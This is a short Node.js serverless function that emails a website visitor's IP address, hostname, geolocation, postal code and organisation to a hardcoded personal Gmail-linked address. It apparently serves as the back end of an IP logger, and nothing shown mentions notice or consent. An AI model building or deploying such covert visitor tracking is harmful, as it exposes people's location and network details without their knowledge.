const nodemailer = require('nodemailer');

exports.handler = async function(event, context) {
  const data = JSON.parse(event.body);

  const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
      user: process.env.EMAIL_USER, // Çevresel değişken olarak e-posta adresi
      pass: process.env.EMAIL_PASS  // Uygulama şifresi
    }
  });

  const mailOptions = {
    from: process.env.EMAIL_USER,
    to: 'yandi.ibrahim@ogr.ahievran.edu.tr',
    subject: 'Kullanıcı IP bilgileri',
    text: `Kullanıcı IP Bilgileri:\n\nCity: ${data.city}\nCountry: ${data.country}\nHostname: ${data.hostname}\nIP: ${data.ip}\nLocation: ${data.loc}\nOrganization: ${data.org}\nPostal Code: ${data.postal}\nRegion: ${data.region}\nTimezone: ${data.timezone}`
  };

  try {
    await transporter.sendMail(mailOptions);
    return {
      statusCode: 200,
      body: JSON.stringify({ message: 'LOL' })
    };
  } catch (error) {
    console.error('SAD:', error); // Hata mesajını loglayın
    return {
      statusCode: 500,
      body: JSON.stringify({ error: 'SAD' })
    };
  }
};
